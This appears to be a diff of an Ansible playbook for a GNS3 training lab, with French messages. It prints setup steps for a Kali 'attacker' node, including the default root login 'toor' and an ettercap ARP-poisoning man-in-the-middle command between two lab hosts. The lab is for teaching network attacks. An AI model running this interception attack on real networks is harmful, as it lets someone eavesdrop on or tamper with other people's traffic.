@@ -225,69 +225,69 @@
     # =========================================================================
     - name: Résumé
       debug:
-        msg: |
-          ========================================
-          KALI LINUX + NAT CONFIGURÉS
-          ========================================
-
-          Node: KALI-ATTACKER
-          Console: telnet {{ gns3_host }} {{ kali.console }}
-
-          Config réseau pré-configurée:
-            - eth0: 192.168.10.100/24 (lab)
-            - eth1: DHCP (Internet via NAT)
-            - DNS: 8.8.8.8, 8.8.4.4
-
-          ========================================
-          IMPORTANT: REDÉMARRER KALI
-          ========================================
-
-          La config réseau a été écrite mais nécessite
-          un redémarrage pour être appliquée:
-
-          1. Dans GNS3 GUI: clic droit sur KALI-ATTACKER
-          2. Stop → Start
-
-          ========================================
-          CONNEXION À KALI
-          ========================================
-
-          telnet {{ gns3_host }} {{ kali.console }}
-          Login: root (mot de passe vide ou toor)
-
-          ========================================
-          INSTALLER LES OUTILS
-          ========================================
-
-          # Vérifier Internet
-          ping -c 2 8.8.8.8
-
-          # Installer les outils d'attaque
-          apt update && apt install -y dsniff ettercap-text-only tcpdump
-
-          ========================================
-          LANCER L'ATTAQUE
-          ========================================
-
-          # 1. Activer IP forwarding (obligatoire!)
-          echo 1 > /proc/sys/net/ipv4/ip_forward
-
-          # 2. Lancer l'attaque
-          ettercap -T -q -M arp:remote /192.168.10.10// /192.168.10.20//
-
-          ========================================
-          VÉRIFIER SUR LES VPCS
-          ========================================
-
-          # Connexion aux VPCs
-          telnet {{ gns3_host }} {{ switch_info.vpc1_console_port }}  # VPC1
-          telnet {{ gns3_host }} {{ switch_info.vpc2_console_port }}  # VPC2
-
-          # Commandes de vérification
-          > clear arp
-          > show arp
-
-          # La MAC de l'autre VPC devrait être
-          # remplacée par la MAC de Kali!
-
-          ========================================
+        msg:
+          - "========================================"
+          - "KALI LINUX + NAT CONFIGURÉS"
+          - "========================================"
+          - ""
+          - "Node: KALI-ATTACKER"
+          - "Console: telnet {{ gns3_host }} {{ kali.console }}"
+          - ""
+          - "Config réseau pré-configurée:"
+          - "  - eth0: 192.168.10.100/24 (lab)"
+          - "  - eth1: DHCP (Internet via NAT)"
+          - "  - DNS: 8.8.8.8, 8.8.4.4"
+          - ""
+          - "========================================"
+          - "IMPORTANT: REDÉMARRER KALI"
+          - "========================================"
+          - ""
+          - "La config réseau a été écrite mais nécessite"
+          - "un redémarrage pour être appliquée:"
+          - ""
+          - "1. Dans GNS3 GUI: clic droit sur KALI-ATTACKER"
+          - "2. Stop -> Start"
+          - ""
+          - "========================================"
+          - "CONNEXION À KALI"
+          - "========================================"
+          - ""
+          - "telnet {{ gns3_host }} {{ kali.console }}"
+          - "Login: root (mot de passe vide ou toor)"
+          - ""
+          - "========================================"
+          - "INSTALLER LES OUTILS"
+          - "========================================"
+          - ""
+          - "# Vérifier Internet"
+          - "ping -c 2 8.8.8.8"
+          - ""
+          - "# Installer les outils d'attaque"
+          - "apt update && apt install -y dsniff ettercap-text-only tcpdump"
+          - ""
+          - "========================================"
+          - "LANCER L'ATTAQUE"
+          - "========================================"
+          - ""
+          - "# 1. Activer IP forwarding (obligatoire!)"
+          - "echo 1 > /proc/sys/net/ipv4/ip_forward"
+          - ""
+          - "# 2. Lancer l'attaque"
+          - "ettercap -T -q -M arp:remote /192.168.10.10// /192.168.10.20//"
+          - ""
+          - "========================================"
+          - "VÉRIFIER SUR LES VPCS"
+          - "========================================"
+          - ""
+          - "# Connexion aux VPCs"
+          - "telnet {{ gns3_host }} {{ switch_info.vpc1_console_port }}  # VPC1"
+          - "telnet {{ gns3_host }} {{ switch_info.vpc2_console_port }}  # VPC2"
+          - ""
+          - "# Commandes de vérification"
+          - "> clear arp"
+          - "> show arp"
+          - ""
+          - "# La MAC de l'autre VPC devrait être"
+          - "# remplacée par la MAC de Kali!"
+          - ""
+          - "========================================"
